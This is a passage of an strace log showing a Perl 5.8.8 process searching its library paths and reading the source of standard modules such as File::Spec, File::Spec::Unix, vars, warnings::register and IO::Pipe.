$mode, $file) if @_ == 3;\n\t    croak \'usage: $fh->open(FILENAME, IOLAYERS)\';\n\t}\n\tif (defined($file) && length($file)\n\t    && ! File::Spec->file_name_is_absolute($file))\n\t{\n\t    $file = File::Spec->rel2abs($file);\n\t}\n\t$file = IO::Handle::_open_mode_string($mode) . \" $file\\0\";\n    }\n    open($fh, $file);\n}\n\n################################################\n## Binmode\n##\n\nsub binmode {\n    ( @_ == 1 or @_ == 2 ) or croak \'usage $fh->binmode([LAYER])\';\n\n    my($fh, $layer) = @_;\n\n    return binmode $$fh unless $layer;\n    return binmode $$fh, $layer;\n}\n\n1;\n", 4096) = 1784
5970  07:11:35.447761 stat64("/etc/perl/File/Spec.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.447778 stat64("/etc/perl/File/Spec.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.447791 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.447803 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.447818 stat64("/usr/local/share/perl/5.8.8/File/Spec.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.447830 stat64("/usr/local/share/perl/5.8.8/File/Spec.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.447844 stat64("/usr/lib/perl5/File/Spec.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.447856 stat64("/usr/lib/perl5/File/Spec.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.447869 stat64("/usr/share/perl5/File/Spec.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.447881 stat64("/usr/share/perl5/File/Spec.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.447894 stat64("/usr/lib/perl/5.8/File/Spec.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.447907 stat64("/usr/lib/perl/5.8/File/Spec.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.447920 stat64("/usr/share/perl/5.8/File/Spec.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.447933 stat64("/usr/share/perl/5.8/File/Spec.pm", {st_mode=S_IFREG|0644, st_size=595, ...}) = 0
5970  07:11:35.447954 open("/usr/share/perl/5.8/File/Spec.pm", O_RDONLY|O_LARGEFILE) = 8
5970  07:11:35.447979 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8eb6a8) = -1 ENOTTY (Inappropriate ioctl for device)
5970  07:11:35.447991 _llseek(8, 0, [0], SEEK_CUR) = 0
5970  07:11:35.448037 read(8, "package File::Spec;\n\nuse strict;\nuse vars qw(@ISA $VERSION);\n\n$VERSION = \'3.12\';\n$VERSION = eval $VERSION;\n\nmy %module = (MacOS   => \'Mac\',\n\t      MSWin32 => \'Win32\',\n\t      os2     => \'OS2\',\n\t      VMS     => \'VMS\',\n\t      epoc    => \'Epoc\',\n\t      NetWare => \'Win32\', # Yes, File::Spec::Win32 works on NetWare.\n\t      symbian => \'Win32\', # Yes, File::Spec::Win32 works on symbian.\n\t      dos     => \'OS2\',   # Yes, File::Spec::OS2 works on DJGPP.\n\t      cygwin  => \'Cygwin\');\n\nmy $module = $module{$^O} || \'Unix\';\n\nrequire \"File/Spec/$module.pm\";\n@ISA = (\"File::Spec::$module\");\n\n1;\n\n__END__\n\n", 4096) = 595
5970  07:11:35.448130 stat64("/etc/perl/vars.pmc", 0xbf8eb4dc) = -1 ENOENT (No such file or directory)
5970  07:11:35.448143 stat64("/etc/perl/vars.pm", 0xbf8eb3ec) = -1 ENOENT (No such file or directory)
5970  07:11:35.448156 stat64("/usr/local/lib/perl/5.8.8/vars.pmc", 0xbf8eb4dc) = -1 ENOENT (No such file or directory)
5970  07:11:35.448168 stat64("/usr/local/lib/perl/5.8.8/vars.pm", 0xbf8eb3ec) = -1 ENOENT (No such file or directory)
5970  07:11:35.448182 stat64("/usr/local/share/perl/5.8.8/vars.pmc", 0xbf8eb4dc) = -1 ENOENT (No such file or directory)
5970  07:11:35.448194 stat64("/usr/local/share/perl/5.8.8/vars.pm", 0xbf8eb3ec) = -1 ENOENT (No such file or directory)
5970  07:11:35.448209 stat64("/usr/lib/perl5/vars.pmc", 0xbf8eb4dc) = -1 ENOENT (No such file or directory)
5970  07:11:35.448220 stat64("/usr/lib/perl5/vars.pm", 0xbf8eb3ec) = -1 ENOENT (No such file or directory)
5970  07:11:35.448233 stat64("/usr/share/perl5/vars.pmc", 0xbf8eb4dc) = -1 ENOENT (No such file or directory)
5970  07:11:35.448244 stat64("/usr/share/perl5/vars.pm", 0xbf8eb3ec) = -1 ENOENT (No such file or directory)
5970  07:11:35.448257 stat64("/usr/lib/perl/5.8/vars.pmc", 0xbf8eb4dc) = -1 ENOENT (No such file or directory)
5970  07:11:35.448269 stat64("/usr/lib/perl/5.8/vars.pm", 0xbf8eb3ec) = -1 ENOENT (No such file or directory)
5970  07:11:35.448282 stat64("/usr/share/perl/5.8/vars.pmc", 0xbf8eb4dc) = -1 ENOENT (No such file or directory)
5970  07:11:35.448295 stat64("/usr/share/perl/5.8/vars.pm", {st_mode=S_IFREG|0644, st_size=1149, ...}) = 0
5970  07:11:35.448315 open("/usr/share/perl/5.8/vars.pm", O_RDONLY|O_LARGEFILE) = 10
5970  07:11:35.448328 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8eb1f8) = -1 ENOTTY (Inappropriate ioctl for device)
5970  07:11:35.448339 _llseek(10, 0, [0], SEEK_CUR) = 0
5970  07:11:35.448355 read(10, "package vars;\n\nuse 5.006;\n\nour $VERSION = \'1.01\';\n\nuse warnings::register;\nuse strict qw(vars subs);\n\nsub import {\n    my $callpack = caller;\n    my ($pack, @imports) = @_;\n    my ($sym, $ch);\n    foreach (@imports) {\n        if (($ch, $sym) = /^([\\$\\@\\%\\*\\&])(.+)/) {\n\t    if ($sym =~ /\\W/) {\n\t\t# time for a more-detailed check-up\n\t\tif ($sym =~ /^\\w+[[{].*[]}]$/) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"Can\'t declare individual elements of hash or array\");\n\t\t} elsif (warnings::enabled() and length($sym) == 1 and $sym !~ tr/a-zA-Z//) {\n\t\t    warnings::warn(\"No need to declare built-in vars\");\n\t\t} elsif  (($^H &= strict::bits(\'vars\'))) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"\'$_\' is not a valid variable name under strict vars\");\n\t\t}\n\t    }\n\t    $sym = \"${callpack}::$sym\" unless $sym =~ /::/;\n\t    *$sym =\n\t\t(  $ch eq \"\\$\" ? \\$$sym\n\t\t : $ch eq \"\\@\" ? \\@$sym\n\t\t : $ch eq \"\\%\" ? \\%$sym\n\t\t : $ch eq \"\\*\" ? \\*$sym\n\t\t : $ch eq \"\\&\" ? \\&$sym \n\t\t : do {\n\t\t     require Carp;\n\t\t     Carp::croak(\"\'$_\' is not a valid variable name\");\n\t\t });\n\t} else {\n\t    require Carp;\n\t    Carp::croak(\"\'$_\' is not a valid variable name\");\n\t}\n    }\n};\n\n1;\n__END__\n\n", 4096) = 1149
5970  07:11:35.448476 stat64("/etc/perl/warnings/register.pmc", 0xbf8eb02c) = -1 ENOENT (No such file or directory)
5970  07:11:35.448518 stat64("/etc/perl/warnings/register.pm", 0xbf8eaf3c) = -1 ENOENT (No such file or directory)
5970  07:11:35.448532 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pmc", 0xbf8eb02c) = -1 ENOENT (No such file or directory)
5970  07:11:35.448563 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pm", 0xbf8eaf3c) = -1 ENOENT (No such file or directory)
5970  07:11:35.448578 stat64("/usr/local/share/perl/5.8.8/warnings/register.pmc", 0xbf8eb02c) = -1 ENOENT (No such file or directory)
5970  07:11:35.448591 stat64("/usr/local/share/perl/5.8.8/warnings/register.pm", 0xbf8eaf3c) = -1 ENOENT (No such file or directory)
5970  07:11:35.448605 stat64("/usr/lib/perl5/warnings/register.pmc", 0xbf8eb02c) = -1 ENOENT (No such file or directory)
5970  07:11:35.448617 stat64("/usr/lib/perl5/warnings/register.pm", 0xbf8eaf3c) = -1 ENOENT (No such file or directory)
5970  07:11:35.448631 stat64("/usr/share/perl5/warnings/register.pmc", 0xbf8eb02c) = -1 ENOENT (No such file or directory)
5970  07:11:35.448643 stat64("/usr/share/perl5/warnings/register.pm", 0xbf8eaf3c) = -1 ENOENT (No such file or directory)
5970  07:11:35.448657 stat64("/usr/lib/perl/5.8/warnings/register.pmc", 0xbf8eb02c) = -1 ENOENT (No such file or directory)
5970  07:11:35.448670 stat64("/usr/lib/perl/5.8/warnings/register.pm", 0xbf8eaf3c) = -1 ENOENT (No such file or directory)
5970  07:11:35.448684 stat64("/usr/share/perl/5.8/warnings/register.pmc", 0xbf8eb02c) = -1 ENOENT (No such file or directory)
5970  07:11:35.448697 stat64("/usr/share/perl/5.8/warnings/register.pm", {st_mode=S_IFREG|0644, st_size=732, ...}) = 0
5970  07:11:35.448718 open("/usr/share/perl/5.8/warnings/register.pm", O_RDONLY|O_LARGEFILE) = 11
5970  07:11:35.448732 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8ead48) = -1 ENOTTY (Inappropriate ioctl for device)
5970  07:11:35.448743 _llseek(11, 0, [0], SEEK_CUR) = 0
5970  07:11:35.448761 read(11, "package warnings::register;\n\nour $VERSION = \'1.01\';\n\nrequire warnings;\n\nsub mkMask\n{\n    my ($bit) = @_;\n    my $mask = \"\";\n\n    vec($mask, $bit, 1) = 1;\n    return $mask;\n}\n\nsub import\n{\n    shift;\n    my $package = (caller(0))[0];\n    if (! defined $warnings::Bits{$package}) {\n        $warnings::Bits{$package}     = mkMask($warnings::LAST_BIT);\n        vec($warnings::Bits{\'all\'}, $warnings::LAST_BIT, 1) = 1;\n        $warnings::Offsets{$package}  = $warnings::LAST_BIT ++;\n\tforeach my $k (keys %warnings::Bits) {\n\t    vec($warnings::Bits{$k}, $warnings::LAST_BIT, 1) = 0;\n\t}\n        $warnings::DeadBits{$package} = mkMask($warnings::LAST_BIT);\n        vec($warnings::DeadBits{\'all\'}, $warnings::LAST_BIT++, 1) = 1;\n    }\n}\n\n1;\n", 4096) = 732
5970  07:11:35.448904 read(11, "", 4096) = 0
5970  07:11:35.448917 close(11)         = 0
5970  07:11:35.449189 _llseek(10, 1148, [1148], SEEK_SET) = 0
5970  07:11:35.457101 _llseek(10, 0, [1148], SEEK_CUR) = 0
5970  07:11:35.457114 close(10)         = 0
5970  07:11:35.457188 _llseek(8, 594, [594], SEEK_SET) = 0
5970  07:11:35.457202 _llseek(8, 0, [594], SEEK_CUR) = 0
5970  07:11:35.457212 close(8)          = 0
5970  07:11:35.457245 stat64("/etc/perl/File/Spec/Unix.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.457260 stat64("/etc/perl/File/Spec/Unix.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.457274 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.457287 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.457301 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.457314 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.457328 stat64("/usr/lib/perl5/File/Spec/Unix.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.457340 stat64("/usr/lib/perl5/File/Spec/Unix.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.457354 stat64("/usr/share/perl5/File/Spec/Unix.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.457366 stat64("/usr/share/perl5/File/Spec/Unix.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.457384 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.457397 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.457411 stat64("/usr/share/perl/5.8/File/Spec/Unix.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.457424 stat64("/usr/share/perl/5.8/File/Spec/Unix.pm", {st_mode=S_IFREG|0644, st_size=7038, ...}) = 0
5970  07:11:35.457446 open("/usr/share/perl/5.8/File/Spec/Unix.pm", O_RDONLY|O_LARGEFILE) = 8
5970  07:11:35.457460 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8eb6a8) = -1 ENOTTY (Inappropriate ioctl for device)
5970  07:11:35.457472 _llseek(8, 0, [0], SEEK_CUR) = 0
5970  07:11:35.457472 read(8, "package File::Spec::Unix;\n\nuse strict;\nuse vars qw($VERSION);\n\n$VERSION = \'1.5\';\n\nsub canonpath {\n    my ($self,$path) = @_;\n    \n    # Handle POSIX-style node names beginning with double slash (qnx, nto)\n    # Handle network path names beginning with double slash (cygwin)\n    # (POSIX says: \"a pathname that begins with two successive slashes\n    # may be interpreted in an implementation-defined manner, although\n    # more than two leading slashes shall be treated as a single slash.\")\n    my $node = \'\';\n    if ( $^O =~ m/^(?:qnx|nto|cygwin)$/ && $path =~ s:^(//[^/]+)(/|\\z):/:s ) {\n      $node = $1;\n    }\n    # This used to be\n    # $path =~ s|/+|/|g unless($^O eq \'cygwin\');\n    # but that made tests 29, 30, 35, 46, and 213 (as of #13272) to fail\n    # (Mainly because trailing \"\" directories didn\'t get stripped).\n    # Why would cygwin avoid collapsing multiple slashes into one? --jhi\n    $path =~ s|/+|/|g;                             # xx////xx  -> xx/xx\n    $path =~ s@(/\\.)+(/|\\Z(?!\\n))@/@g;             # xx/././xx -> xx/xx\n    $path =~ s|^(\\./)+||s unless $path eq \"./\";    # ./xx      -> xx\n    $path =~ s|^/(\\.\\./)+|/|;                      # /../../xx -> xx\n    $path =~ s|^/\\.\\.$|/|;                         # /..       -> /\n    $path =~ s|/\\Z(?!\\n)|| unless $path eq \"/\";          # xx/       -> xx\n    return \"$node$path\";\n}\n\nsub catdir {\n    my $self = shift;\n\n    $self->canonpath(join(\'/\', @_, \'\')); # \'\' because need a trailing \'/\'\n}\n\nsub catfile {\n    my $self = shift;\n    my $file = $self->canonpath(pop @_);\n    return $file unless @_;\n    my $dir = $self->catdir(@_);\n    $dir .= \"/\" unless substr($dir,-1) eq \"/\";\n    return $dir.$file;\n}\n\nsub curdir () { \'.\' }\n\nsub devnull () { \'/dev/null\' }\n\nsub rootdir () { \'/\' }\n\nmy $tmpdir;\nsub _tmpdir {\n    return $tmpdir if defined $tmpdir;\n    my $self = shift;\n    my @dirlist = @_;\n    {\n\tno strict \'refs\';\n\tif (${\"\\cTAINT\"}) { # Check for taint mode on perl >= 5.8.0\n            require Scalar::Util;\n\t    @dirlist = grep { ! Scalar::Util::tainted($_) } @dirlist;\n\t}\n    }\n    foreach (@dirlist) {\n\tnext unless defined && -d && -w _;\n\t$tmpdir = $_;\n\tlast;\n    }\n    $tmpdir = $self->curdir unless defined $tmpdir;\n    $tmpdir = defined $tmpdir && $self->canonpath($tmpdir);\n    return $tmpdir;\n}\n\nsub tmpdir {\n    return $tmpdir if defined $tmpdir;\n    $tmpdir = $_[0]->_tmpdir( $ENV{TMPDIR}, \"/tmp\" );\n}\n\nsub updir () { \'..\' }\n\nsub no_upwards {\n    my $self = shift;\n    return grep(!/^\\.{1,2}\\Z(?!\\n)/s, @_);\n}\n\nsub case_tolerant () { 0 }\n\nsub file_name_is_absolute {\n    my ($self,$file) = @_;\n    return scalar($file =~ m:^/:s);\n}\n\nsub path {\n    return () unless exists $ENV{PATH};\n    my @path = split(\':\', $ENV{PATH});\n    foreach (@path) { $_ = \'.\' if $_ eq \'\' }\n    return @path;\n}\n\nsub join {\n    my $self = shift;\n    return $self->catfile(@_);\n}\n\nsub splitpath {\n    my ($self,$path, $nofile) = @_;\n\n    my ($volume,$directory,$file) = (\'\',\'\',\'\');\n\n    if ( $nofile ) {\n        $directory = $path;\n    }\n    else {\n        $path =~ m|^ ( (?: .* / (?: \\.\\.?\\Z(?!\\n) )? )? ) ([^/]*) |xs;\n        $directory = $1;\n        $file      = $2;\n    }\n\n    return ($volume,$directory,$file);\n}\n\nsub splitdir {\n    return split m|/|, $_[1], -1;  # Preserve trailing fields\n}\n\nsub catpath {\n    my ($self,$volume,$directory,$file) = @_;\n\n    if ( $directory ne \'\'                && \n         $file ne \'\'                     && \n         substr( $directory, -1 ) ne \'/\' && \n         substr( $file, 0, 1 ) ne \'/\' \n    ) {\n        $directory .= \"/$file\" ;\n    }\n    else {\n        $directory .= $file ;\n    }\n\n    return $directory ;\n}\n\nsub abs2rel {\n    my($self,$path,$base) = @_;\n\n    # Figure out the effective $base and clean it up.\n    if ( !defined( $base ) || $base eq \'\' ) {\n        $base = $self->_cwd();\n    }\n    elsif ( ! $self->file_name_is_absolute( $base ) ) {\n\tif ( ! $self->file_name_is_absolute( $path ) ) {\n\t    # optimisation where both paths are relative: save 2 x cwd\n\t    $base = $self->canonpath( \"/$base\" );\n\t    $path = \"/$path\";\n\t}\n\telse {\n\t    $base = $self->rel2abs( $base ) ;\n\t}\n    }\n  ", 4096) = 4096
5970  07:11:35.458164 brk(0x8218000)    = 0x8218000
5970  07:11:35.458294 read(8, "  else {\n        $base = $self->canonpath( $base ) ;\n    }\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        $path = $self->rel2abs( $path ) ;\n    }\n    else {\n        $path = $self->canonpath( $path ) ;\n    }\n\n    # Now, remove all leading components that are the same\n    my @pathchunks = $self->splitdir( $path);\n    my @basechunks = $self->splitdir( $base);\n\n    while (@pathchunks && @basechunks && $pathchunks[0] eq $basechunks[0]) {\n        shift @pathchunks ;\n        shift @basechunks ;\n    }\n\n    $path = CORE::join( \'/\', @pathchunks );\n    $base = CORE::join( \'/\', @basechunks );\n\n    # $base now contains the directories the resulting relative path \n    # must ascend out of before it can descend to $path_directory.  So, \n    # replace all names with $parentDir\n    $base =~ s|[^/]+|..|g ;\n\n    # Glue the two together, using a separator if necessary, and preventing an\n    # empty result.\n    if ( $path ne \'\' && $base ne \'\' ) {\n        $path = \"$base/$path\" ;\n    } else {\n        $path = \"$base$path\" ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\nsub rel2abs {\n    my ($self,$path,$base ) = @_;\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        # Figure out the effective $base and clean it up.\n        if ( !defined( $base ) || $base eq \'\' ) {\n\t    $base = $self->_cwd();\n        }\n        elsif ( ! $self->file_name_is_absolute( $base ) ) {\n            $base = $self->rel2abs( $base ) ;\n        }\n        else {\n            $base = $self->canonpath( $base ) ;\n        }\n\n        # Glom them together\n        $path = $self->catdir( $base, $path ) ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\n# Internal routine to File::Spec, no point in making this public since\n# it is the standard Cwd interface.  Most of the platform-specific\n# File::Spec subclasses use this.\nsub _cwd {\n    require Cwd;\n    Cwd::cwd();\n}\n\n# Internal method to reduce xx\\..\\yy -> yy\nsub _collapse {\n    my($fs, $path) = @_;\n\n    my $updir  = $fs->updir;\n    my $curdir = $fs->curdir;\n\n    my($vol, $dirs, $file) = $fs->splitpath($path);\n    my @dirs = $fs->splitdir($dirs);\n\n    my @collapsed;\n    foreach my $dir (@dirs) {\n        if( $dir eq $updir              and   # if we have an updir\n            @collapsed                  and   # and something to collapse\n            length $collapsed[-1]       and   # and its not the rootdir\n            $collapsed[-1] ne $updir    and   # nor another updir\n            $collapsed[-1] ne $curdir         # nor the curdir\n          ) \n        {                                     # then\n            pop @collapsed;                   # collapse\n        }\n        else {                                # else\n            push @collapsed, $dir;            # just hang onto it\n        }\n    }\n\n    return $fs->catpath($vol,\n                        $fs->catdir(@collapsed),\n                        $file\n                       );\n}\n\n1;\n", 4096) = 2942
5970  07:11:35.458718 read(8, "", 4096) = 0
5970  07:11:35.458733 close(8)          = 0
5970  07:11:35.459018 read(6, "", 4096) = 0
5970  07:11:35.459033 close(6)          = 0
5970  07:11:35.459198 stat64("/etc/perl/IO/Pipe.pmc", 0xbf8ebe3c) = -1 ENOENT (No such file or directory)
5970  07:11:35.459214 stat64("/etc/perl/IO/Pipe.pm", 0xbf8ebd4c) = -1 ENOENT (No such file or directory)
5970  07:11:35.459228 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pmc", 0xbf8ebe3c) = -1 ENOENT (No such file or directory)
5970  07:11:35.459241 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pm", 0xbf8ebd4c) = -1 ENOENT (No such file or directory)
5970  07:11:35.459255 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pmc", 0xbf8ebe3c) = -1 ENOENT (No such file or directory)
5970  07:11:35.459268 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pm", 0xbf8ebd4c) = -1 ENOENT (No such file or directory)
5970  07:11:35.459281 stat64("/usr/lib/perl5/IO/Pipe.pmc", 0xbf8ebe3c) = -1 ENOENT (No such file or directory)
5970  07:11:35.459293 stat64("/usr/lib/perl5/IO/Pipe.pm", 0xbf8ebd4c) = -1 ENOENT (No such file or directory)
5970  07:11:35.459306 stat64("/usr/share/perl5/IO/Pipe.pmc", 0xbf8ebe3c) = -1 ENOENT (No such file or directory)
5970  07:11:35.459318 stat64("/usr/share/perl5/IO/Pipe.pm", 0xbf8ebd4c) = -1 ENOENT (No such file or directory)
5970  07:11:35.459331 stat64("/usr/lib/perl/5.8/IO/Pipe.pmc", 0xbf8ebe3c) = -1 ENOENT (No such file or directory)
5970  07:11:35.459343 stat64("/usr/lib/perl/5.8/IO/Pipe.pm", {st_mode=S_IFREG|0644, st_size=3426, ...}) = 0
5970  07:11:35.459398 open("/usr/lib/perl/5.8/IO/Pipe.pm", O_RDONLY|O_LARGEFILE) = 6
5970  07:11:35.459449 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8ebb58) = -1 ENOTTY (Inappropriate ioctl for device)
5970  07:11:35.459461 _llseek(6, 0, [0], SEEK_CUR) = 0
5970  07:11:35.459499 read(6, "# IO::Pipe.pm\n#\n# Copyright (c) 1996-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Pipe;\n\nuse 5.006_001;\n\nuse IO::Handle;\nuse strict;\nour($VERSION);\nuse Carp;\nuse Symbol;\n\n$VERSION = \"1.13\";\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::Pipe\";\n    @_ == 0 || @_ == 2 or croak \"usage: new $class [READFH, WRITEFH]\";\n\n    my $me = bless gensym(), $class;\n\n    my($readfh,$writefh) = @_ ? @_ : $me->handles;\n\n    pipe($readfh, $writefh)\n\tor return undef;\n\n    @{*$me} = ($readfh, $writefh);\n\n    $me;\n}\n\nsub handles {\n    @_ == 1 or croak \'usage: $pipe->handles()\';\n    (IO::Pipe::End->new(), IO::Pipe::End->new());\n}\n\nmy $do_spawn = $^O eq \'os2\' || $^O eq \'MSWin32\';\n\nsub _doit {\n    my $me = shift;\n    my $rw = shift;\n\n    my $pid = $do_spawn ? 0 : fork();\n\n    if($pid) { # Parent\n        return $pid;\n    }\n    elsif(defined $pid) { # Child or spawn\n        my $fh;\n        my $io = $rw ? \\*STDIN : \\*STDOUT;\n        my ($mode, $save) = $rw ? \"r\" : \"w\";\n        if ($do_spawn) {\n          require Fcntl;\n          $save = IO::Handle->new_from_fd($io, $mode);\n\t  my $handle = shift;\n          # Close in child:\n\t  unless ($^O eq \'MSWin32\') {\n            fcntl($handle, Fcntl::F_SETFD(), 1) or croak \"fcntl: $!\";\n\t  }\n          $fh = $rw ? ${*$me}[0] : ${*$me}[1];\n        } else {\n          shift;\n          $fh = $rw ? $me->reader() : $me->writer(); # close the other end\n        }\n        bless $io, \"IO::Handle\";\n        $io->fdopen($fh, $mode);\n\t$fh->close;\n\n        if ($do_spawn) {\n          $pid = eval { system 1, @_ }; # 1 == P_NOWAIT\n          my $err = $!;\n    \n          $io->fdopen($save, $mode);\n          $save->close or croak \"Cannot close $!\";\n          croak \"IO::Pipe: Cannot spawn-NOWAIT: $err\" if not $pid or $pid < 0;\n          return $pid;\n        } else {\n          exec @_ or\n            croak \"IO::Pipe: Cannot exec: $!\";\n        }\n    }\n    else {\n        croak \"IO::Pipe: Cannot fork: $!\";\n    }\n\n    # NOT Reached\n}\n\nsub reader {\n    @_ >= 1 or croak \'usage: $pipe->reader( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[0];\n    my $pid;\n    $pid = $me->_doit(0, $fh, @_)\n        if(@_);\n\n    close ${*$me}[1];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"r\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\nsub writer {\n    @_ >= 1 or croak \'usage: $pipe->writer( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[1];\n    my $pid;\n    $pid = $me->_doit(1, $fh, @_)\n        if(@_);\n\n    close ${*$me}[0];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"w\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\npackage IO::Pipe::End;\n\nour(@ISA);\n\n@ISA = qw(IO::Handle);\n\nsub close {\n    my $fh = shift;\n    my $r = $fh->SUPER::close(@_);\n\n    waitpid(${*$fh}{\'io_pipe_pid\'},0)\n\tif(defined ${*$fh}{\'io_pipe_pid\'});\n\n    $r;\n}\n\n1;\n\n__END__\n\n", 4096) = 3426
5970  07:11:35.461013 _llseek(6, 3425, [3425], SEEK_SET) = 0
5970  07:11:35.461032 _llseek(6, 0, [3425], SEEK_CUR) = 0
5970  07:11:35.461043 close(6)          = 0
5970  07:11:35.461081 stat64("/etc/perl/IO/Socket.pmc", 0xbf8ebe3c) = -1 ENOENT (No such file or directory)
5970  07:11:35.461095 stat64("/etc/perl/IO/Socket.pm", 0xbf8ebd4c) = -1 ENOENT (No such file or directory)
5970  07:11:35.461108 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pmc", 0xbf8ebe3c) = -1 ENOENT (No such file or directory)
5970  07:11:35.461121 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pm", 0xbf8ebd4c) = -1 ENOENT (No such file or directory)
5970  07:11:35.461135 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pmc", 0xbf8ebe3c) = -1 ENOENT (No such file or directory)
5970  07:11:35.461148 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pm", 0xbf8ebd4c) = -1 ENOENT (No such file or directory)
5970  07:11:35.461162 stat64("/usr/lib/perl5/IO/Socket.pmc", 0xbf8ebe3c) = -1 ENOENT (No such file or directory)
5970  07:11:35.461173 stat64("/usr/lib/perl5/IO/Socket.pm", 0xbf8ebd4c) = -1 ENOENT (No such file or directory)
5970  07:11:35.461186 stat64("/usr/share/perl5/IO/Socket.pmc", 0xbf8ebe3c) = -1 ENOENT (No such file or directory)
5970  07:11:35.461198 stat64("/usr/share/perl5/IO/Socket.pm", 0xbf8ebd4c) = -1 ENOENT (No such file or directory)
5970  07:11:35.461211 stat64("/usr/lib/perl/5.8/IO/Socket.pmc", 0xbf8ebe3c) = -1 ENOENT (No such file or directory)
5970  07:11:35.461224 stat64("/usr/lib/perl/5.8/IO/Socket.pm", {st_mode=S_IFREG|0644, st_size=6699, ...}) = 0
5970  07:11:35.461245 open("/usr/lib/perl/5.8/IO/Socket.pm", O_RDONLY|O_LARGEFILE) = 6
5970  07:11:35.461259 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8ebb58) = -1 ENOTTY (Inappropriate ioctl for device)
5970  07:11:35.461271 _llseek(6, 0, [0], SEEK_CUR) = 0
